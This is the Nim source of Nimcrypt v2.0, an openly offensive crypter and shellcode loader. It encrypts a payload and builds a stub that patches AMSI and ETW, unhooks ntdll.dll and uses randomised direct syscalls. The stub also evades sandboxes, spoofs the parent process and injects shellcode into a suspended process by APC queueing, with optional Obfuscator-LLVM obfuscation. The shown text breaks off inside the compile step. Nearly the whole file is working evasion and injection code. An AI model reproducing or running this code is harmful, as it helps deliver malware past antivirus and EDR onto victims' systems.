#[

    Author: Matthew David, Twitter: @icyguider
    Credits: @byt3bl33d3r, @ShitSecure, & @ajpc500
    License: GPL v3.0

    NIMCRYPT v2.0
]#

import nimcrypto
import nimcrypto/sysrand
import base64
import strformat
import docopt
import random
import sugar
import strutils
import osproc
import os

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))


let inspiration = """
                      ___                                           
                   .-'   `'.                                        
                  /         \                                       
                  |         ;                                       
                  |         |           ___.--,                     
         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
 ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
 _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
      | |  .' _.-' |  |  \  \  '.               `~---`              
       \ \/ .'     \  \   '. '-._)                                  
        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
   jgs  / /\         `) )    / / `"".`\                             
  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
   `--~`   ) )    .-'.'      '.'.  | (                              
          (/`    ( (`          ) )  '-;                             
           `      '-;         (-'                                   
"""

echo inspiration

#Handle arguments

let doc = """
Nimcrypt v 2.0

Usage:
  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v] [--no-ppid-spoof]
  nimcrypt (-h | --help)

Options:
  -h --help     Show this screen.
  --version     Show version.
  -f --file filename     File to load
  -t --type filetype     Type of file (csharp, raw, or pe)
  -p --process process   Name of process for shellcode injection
  -o --output filename   Filename for compiled exe
  -u --unhook            Unhook ntdll.dll
  -v --verbose           Enable verbose messages during execution
  -e --encrypt-strings   Encrypt strings using the strenc module
  -g --get-syscallstub   Use GetSyscallStub instead of NimlineWhispers2
  -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary
  -n --no-randomization  Disable syscall name randomization
  -s --no-sandbox        Disable sandbox checks
  --no-ppid-spoof        Disable PPID Spoofing
"""


let args = docopt(doc, version = "Nimcrypt 2.0")

# Geneate Random Encryption Key
let chars = {'a'..'z','A'..'Z'}
randomize()
var envkey = collect(newSeq, (for i in 0..<32: chars.sample)).join

var filename: string = ""
var outfile: string = "a.exe"
var typename: string = ""
var process: string = "explorer.exe"
var unhook: bool = false
var verbose: bool = false
var encrypt_strings: bool = false
var llvm_obfuscator: bool = false
var get_syscallstub: bool = false
var no_sandbox: bool = false
var no_randomization: bool = false
var no_ppid_spoof: bool = false

if args["--file"]:
  filename = $args["--file"]

if args["--type"]:
  typename = $args["--type"]

if args["--process"]:
  process = $args["--process"]

if args["--unhook"]:
  unhook = args["--unhook"]

if args["--encrypt-strings"]:
  encrypt_strings = args["--encrypt-strings"]
  get_syscallstub = args["--encrypt-strings"]

if args["--no-sandbox"]:
  no_sandbox = args["--no-sandbox"]

if args["--verbose"]:
  verbose = args["--verbose"]

if args["--llvm-obfuscator"]:
  llvm_obfuscator = args["--llvm-obfuscator"]
  get_syscallstub = args["--llvm-obfuscator"]

if args["--get-syscallstub"]:
  get_syscallstub = args["--get-syscallstub"]

if args["--no-randomization"]:
  no_randomization = args["--no-randomization"]

if args["--no-ppid-spoof"]:
  no_ppid_spoof = args["--no-ppid-spoof"]

if args["--output"]:
  outfile = $args["--output"]

#Read file
let blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)
    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()

let encoded = encode(enctext)
let encodedIV = encode(iv)

let getsyscallstub_code = """
# Credit/References
# @ShitSecure: https://github.com/S3cur3Th1sSh1t/NimGetSyscallStub/blob/main/ShellcodeInject.nim

# Unmanaged NTDLL Declarations
type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
type myNtProtectVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
type myNtAlertResumeThread = proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
type myNtWaitForSingleObject = proc(ObjectHandle: HANDLE, Alertable: BOOLEAN, TimeOut: PLARGE_INTEGER): NTSTATUS {.stdcall.}

let tProcess2 = GetCurrentProcessId()
var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

let syscallStub_NtOpenProcess = VirtualAllocEx(pHandle2, NULL, cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

var syscallStub_NtAllocateVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtOpenProcess) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtWriteVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtAllocateVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtCreateThreadEx: HANDLE = cast[HANDLE](syscallStub_NtWriteVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtProtectVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtCreateThreadEx) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtectVirtualMemory) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtQueueApcThread: HANDLE = cast[HANDLE](syscallStub_NtClose) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtAlertResumeThread: HANDLE = cast[HANDLE](syscallStub_NtQueueApcThread) + cast[HANDLE](SYSCALL_STUB_SIZE)
var syscallStub_NtWaitForSingleObject: HANDLE = cast[HANDLE](syscallStub_NtAlertResumeThread) + cast[HANDLE](SYSCALL_STUB_SIZE)

var oldProtection: DWORD = 0

# define NtOpenProcess
var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenProcess));
VirtualProtect(cast[LPVOID](syscallStub_NtOpenProcess), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtAllocateVirtualMemory
let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAllocateVirtualMemory));
VirtualProtect(cast[LPVOID](syscallStub_NtAllocateVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtWriteVirtualMemory
let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWriteVirtualMemory));
VirtualProtect(cast[LPVOID](syscallStub_NtWriteVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtCreateThreadEx
let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThreadEx));
VirtualProtect(cast[LPVOID](syscallStub_NtCreateThreadEx), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtProtectVirtualMemory
let NtProtectVirtualMemory = cast[myNtProtectVirtualMemory](cast[LPVOID](syscallStub_NtProtectVirtualMemory));
VirtualProtect(cast[LPVOID](syscallStub_NtProtectVirtualMemory), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# definte NtClose
let NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose));
VirtualProtect(cast[LPVOID](syscallStub_NtClose), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtQueueApcThread
let NtQueueApcThread = cast[myNtQueueApcThread](cast[LPVOID](syscallStub_NtQueueApcThread));
VirtualProtect(cast[LPVOID](syscallStub_NtQueueApcThread), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtAlertResumeThread
let NtAlertResumeThread = cast[myNtAlertResumeThread](cast[LPVOID](syscallStub_NtAlertResumeThread));
VirtualProtect(cast[LPVOID](syscallStub_NtAlertResumeThread), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

# define NtWaitForSingleObject
let NtWaitForSingleObject = cast[myNtWaitForSingleObject](cast[LPVOID](syscallStub_NtWaitForSingleObject));
VirtualProtect(cast[LPVOID](syscallStub_NtWaitForSingleObject), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

var success: BOOL

var NtOpenProcess_str = decode("TnRPcGVuUHJvY2Vzcw==")
var NtAllocateVirtualMemory_str = decode("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=")
var NtWriteVirtualMemory_str = decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk=")
var NtCreateThreadEx_str = decode("TnRDcmVhdGVUaHJlYWRFeA==")
var NtProtectVirtualMemory_str = decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==")
var NtClose_str = decode("TnRDbG9zZQ==")
var NtQueueApcThread_str = decode("TnRRdWV1ZUFwY1RocmVhZA==")
var NtAlertResumeThread_str = decode("TnRBbGVydFJlc3VtZVRocmVhZA==")
var NtWaitForSingleObject_str = decode("TnRXYWl0Rm9yU2luZ2xlT2JqZWN0")

var gss_verbose: bool = REPLACE_ME_VERBOSE

success = GetSyscallStub(NtOpenProcess_str, cast[LPVOID](syscallStub_NtOpenProcess));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtOpenProcess_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtOpenProcess_str}"
success = GetSyscallStub(NtAllocateVirtualMemory_str, cast[LPVOID](syscallStub_NtAllocateVirtualMemory));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtAllocateVirtualMemory_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtAllocateVirtualMemory_str}"
success = GetSyscallStub(NtWriteVirtualMemory_str, cast[LPVOID](syscallStub_NtWriteVirtualMemory));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtWriteVirtualMemory_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtWriteVirtualMemory_str}"
success = GetSyscallStub(NtCreateThreadEx_str, cast[LPVOID](syscallStub_NtCreateThreadEx));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtCreateThreadEx_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtCreateThreadEx_str}"
success = GetSyscallStub(NtProtectVirtualMemory_str, cast[LPVOID](syscallStub_NtProtectVirtualMemory));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtProtectVirtualMemory_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtProtectVirtualMemory_str}"
success = GetSyscallStub(NtClose_str, cast[LPVOID](syscallStub_NtClose));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtClose_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtClose_str}"
success = GetSyscallStub(NtQueueApcThread_str, cast[LPVOID](syscallStub_NtQueueApcThread));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtQueueApcThread_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtQueueApcThread_str}"
success = GetSyscallStub(NtAlertResumeThread_str, cast[LPVOID](syscallStub_NtAlertResumeThread));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtAlertResumeThread_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtAlertResumeThread_str}"
success = GetSyscallStub(NtWaitForSingleObject_str, cast[LPVOID](syscallStub_NtWaitForSingleObject));
if gss_verbose == true:
    if success == 1:
        echo fmt"[*] Found Syscall Stub: {NtWaitForSingleObject_str}"
    else:
        echo fmt"[!] Failed to Get Syscall Stub: {NtWaitForSingleObject_str}"

discard NtClose(pHandle2)
"""

let amsi_etw_patch = """
# Credit/References
# @byt3bl33d3r: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
# @byt3bl33d3r/@ShitSecure: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/etw_patch_bin.nim

const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
const etw_patch: array[1, byte] = [byte 0xc3]

var hProc: HANDLE = GetCurrentProcess()

proc Pm(): bool =
    var
        gum: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        bytesWritten: SIZE_T
        patch_size: SIZE_T = cast[SIZE_T](patch.len)
        disabled: bool = false

    var boop = "a"&"m"&"s"&"i"
    gum = loadLib(boop)

    cs = gum.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    var pAddr = cs
    var status = NtProtectVirtualMemory(hProc, addr pAddr, addr patch_size, 0x40, &op)
    if status == 0:
        status = NtWriteVirtualMemory(hProc, cs, unsafeAddr patch, patch.len, &bytesWritten)
        status = NtProtectVirtualMemory(hProc, addr pAddr, addr patch_size, op, &t)
        disabled = true

    return disabled

proc PETW(): bool =
    var
        etw: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        bytesWritten: SIZE_T
        patch_size: SIZE_T = cast[SIZE_T](etw_patch.len)
        disabled: bool = false

    etw = loadlib("ntdll")

    cs = etw.symAddr("EtwEventWrite")
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    var pAddr = cs
    var status = NtProtectVirtualMemory(hProc, &pAddr, &patch_size, 0x40, &op)
    if status == 0:
        status = NtWriteVirtualMemory(hProc, cs, unsafeAddr etw_patch, etw_patch.len, &bytesWritten)
        status = NtProtectVirtualMemory(hProc, &pAddr, &patch_size, op, &t)
        disabled = true

    return disabled

var patch_success = Pm()
echo fmt"[*] Applying amsi patch: {patch_success}"
patch_success = PETW()
echo fmt"[*] Applying etw patch: {patch_success}"
discard NtClose(hProc)
"""

let ntdllunhook = """
# Credit/References
# @whydee86: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/unhook.nim

proc toStrings(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      status: NTSTATUS
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toStrings(hookedSectionHeader.Name):
          var oldProtection: DWORD = 0
          var oldProtection2: DWORD = 0
          var bytesWritten: SIZE_T
          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
          if status != 0:
            echo fmt"[!] NtProtectVirtualMemory failed to modify memory permissions: {GetLastError()}."
            return false
          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
          if status != 0:
            echo fmt"[!] NtWriteVirtualMemory failed to write bytes to target address: {GetLastError()}."
            return false
          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
          if status != 0:
            echo fmt"[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections: {GetLastError()}."
            return false  
  status = NtClose(processH)
  status = NtClose(ntdllFile)
  status = NtClose(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true

let result = ntdllunhook()
echo fmt"[*] Unhook ntdll: {bool(result)}"
"""

let sandbox_checks = """
# Credit/References
# @snovvcrash: https://github.com/snovvcrash/NimHollow/blob/main/NimHollow.nim
proc isEmulated(): bool =
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x20, # PAGE_EXECUTE_READ
        0)

    if isNil(mem):
        return true
    return false

proc sleepAndCheck(): bool =
    randomize()
    let dreaming = rand(5000..10000)
    let delta = dreaming - 500
    let before = now()
    sleep(dreaming)
    if (now() - before).inMilliseconds < delta:
        return false
    return true

echo "[*] Running sandbox checks..."
if isEmulated():
    echo "[-] VirtualAllocExNuma did not pass the check, exiting"
    quit()

if not sleepAndCheck():
    echo "[-] Sleep did not pass the check, exiting"
    quit()
"""

if toLowerAscii(typename) == "raw":
    let stub = """
# Credit/References 
# @byt3bl33d3r: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
# @ajpc500: https://github.com/ajpc500/NimExamples/blob/main/src/SysCallsMessageBoxShellCodeQueueUserAPCInject.nim

import winim
import nimcrypto
import base64
import strformat
import strutils
import ptr_math
import random
import times
import os
REPLACE_ME_STRENC
include REPLACE_ME_SYSCALL_INCLUDE

REPLACE_ME_GETSYSCALLSTUB

const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000

proc toStringPPID(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toStringPPID == process_name:
                pid = entry.th32ProcessID
                break

    return pid

proc inject(shellcode: ptr, sc_len: int): void =

    var
        si: STARTUPINFOEX
        pi: PROCESS_INFORMATION
        ps: SECURITY_ATTRIBUTES
        ts: SECURITY_ATTRIBUTES
        policy: DWORD64
        lpSize: SIZE_T
        res: WINBOOL
        pHandle: HANDLE
        tHandle: HANDLE
        ds: LPVOID
        sc_size: SIZE_T = cast[SIZE_T](sc_len)

    si.StartupInfo.cb = sizeof(si).cint
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint

    InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, addr policy, sizeof(policy), NULL, NULL);

    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT

    DeleteProcThreadAttributeList(si.lpAttributeList)

    var status = 0
    PPID_SPOOF_START
    var processId = GetProcessByName("explorer.exe")
    echo fmt"[*] Found PPID: {processId}"

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var parentHandle: HANDLE

    cid.UniqueProcess = processID

    status = NtOpenProcess(&parentHandle, PROCESS_ALL_ACCESS, &oa, &cid)
    if status == 0:
        echo "[*] NtOpenProcess opened parent process successfully."
    else:
        echo fmt"[!] NtOpenProcess failed to open parent process: {status}"

    res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, addr parentHandle, sizeof(parentHandle), NULL, NULL)
    PPID_SPOOF_END

    res = CreateProcess(
        NULL,
        newWideCString(r"REPLACE_ME_PROCESS"),
        ps,
        ts, 
        TRUE,
        CREATE_SUSPENDED or DETACHED_PROCESS or CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    )

    echo fmt"[*] Started process with PID: {pi.dwProcessId}"

    pHandle = pi.hProcess
    tHandle = pi.hThread

    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size, MEM_COMMIT, PAGE_READWRITE);
    if status == 0:
        echo "[*] NtAllocateVirtualMemory allocated memory in the created process sucessfully."
    else:
        echo fmt"[!] NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: {res}"

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(pHandle, ds, shellcode, sc_size-1, addr bytesWritten);
    if status == 0:
        echo "[*] NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."
    else:
        echo fmt"[!] NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: {res}"

    var oldprotect: DWORD = 0;

    status = NtProtectVirtualMemory(pHandle, &ds, &sc_size, PAGE_EXECUTE_READ, &oldprotect)
    if status == 0:
        echo "[*] NtProtectVirtualMemory modified permissions successfully."
    else:
        echo fmt"NtProtectVirtualMemory FAILED to modify permissions: {res}"

    status = NtQueueApcThread(tHandle, cast[PKNORMAL_ROUTINE](ds), ds, NULL, NULL)
    if status == 0:
        echo "[*] NtQueueApcThread added routine to APC queue successfully."
    else:
        echo fmt"[!] NtQueueApcThread FAILED to add routine to APC queue: {res}"

    status = NtAlertResumeThread(tHandle, NULL)
    if status == 0:
        echo "[*] NtAlertResumeThread resumed thread successfully."
    else:
        echo fmt"[!] NtAlertResumeThread FAILED to resume thread:  {res}"

    status = NtClose(tHandle)
    status = NtClose(pHandle)

REPLACE_ME_SANDBOX_CHECKS

REPLACE_ME_NTDLL_UNHOOK

when defined(windows):
    const sc_length: int = 941
        
    # Decrypt.nim
    func toByteSeq*(str: string): seq[byte] {.inline.} =
      # Converts a string to the corresponding byte sequence.
      @(str.toOpenArrayByte(0, str.high))

    var dctx: CTR[aes256]

    var enctext: seq[byte] = toByteSeq(decode("REPLACE_ME_ENCODED_BLOB"))
    var key: array[aes256.sizeKey, byte]
    var envkey: string = "REPLACE_ME_KEY"
    var iv: array[aes256.sizeBlock, byte]
    var pp: string = decode("REPLACE_ME_IV")

    # Decode and save IV
    copyMem(addr iv[0], addr pp[0], len(pp))

    # Encrypt Key
    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

    var dectext = newSeq[byte](len(enctext))

    # Decrypt
    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()

    var shellcodePtr = (cast[ptr array[sc_length, byte]](addr dectext[0]))
    inject(shellcodePtr, len(dectext))
    """

    echo fmt"[+] Using {process} for shellcode injection"
    var stubFinal: string = stub.replace("REPLACE_ME_PROCESS", process)
    if get_syscallstub == true:
        echo "[+] GetSyscallStub enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "GetSyscallStub")
        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", getsyscallstub_code)
    else:
        echo "[+] NimlineWhispers2 enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "syscalls2")
        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", "")
    if encrypt_strings == true:
        echo "[+] String encryption enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "import strenc")
    else:
        echo "[+] String encryption disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "")
    if no_sandbox == false:
        echo "[+] Sandbox checks enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", sandbox_checks)
    else:
        echo "[+] Sandbox checks disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", "")
    if unhook == true:
        echo "[+] Unhooking ntdll.dll enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", ntdllunhook)
    else:
        echo "[+] Unhooking ntdll.dll disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", "")
    if no_ppid_spoof == true:
        echo "[+] PPID spoofing disabled"
        stubFinal = stubFinal.replace("PPID_SPOOF_START", "#[")
        stubFinal = stubFinal.replace("PPID_SPOOF_END", "]#")
    else:
        echo "[+] PPID spoofing enabled"
        stubFinal = stubFinal.replace("PPID_SPOOF_START", "")
        stubFinal = stubFinal.replace("PPID_SPOOF_END", "")
    if verbose == true:
        echo "[+] Verbose messages enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "true")
    else:
        echo "[+] Verbose messages disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "false")
    stubFinal = stubFinal.replace("REPLACE_ME_ENCODED_BLOB", encoded)
    stubFinal = stubFinal.replace("REPLACE_ME_KEY", envkey)
    stubFinal = stubFinal.replace("REPLACE_ME_IV", encodedIV)
    var syscalls_content: string = readFile("syscalls.nim")
    if no_randomization == false:
        echo "[+] Syscall name randomization enabled"
        let syscalls = ["NtWriteVirtualMemory", "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtOpenProcess", "NtQueueApcThread", "NtAlertResumeThread", "NtClose", "NtCreateThreadEx", "NtWaitForSingleObject"]
        for syscall in syscalls:
            randomize()
            var newsyscall = collect(newSeq, (for i in 0..<24: chars.sample)).join
            syscalls_content = syscalls_content.replace(syscall, newsyscall)
            stubFinal = stubFinal.replace(syscall, newsyscall)
    else:
        echo "[+] Syscall name randomization disabled"
    writeFile("syscalls2.nim", syscalls_content)
    writeFile("stub.nim", stubFinal)
    if os.fileExists(outfile) == true:
        discard os.execShellCmd(fmt"rm {outfile}")
    if verbose == true:
        if llvm_obfuscator == false:
            discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
        else:
            echo "[+] Using LLVM-Obfuscator to compile"
            var result = execCmdEx("x86_64-w64-mingw32-clang -v")
            if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
                let ochars = {'A'..'Z','0'..'9'}
                var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
                #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
                discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
            else:
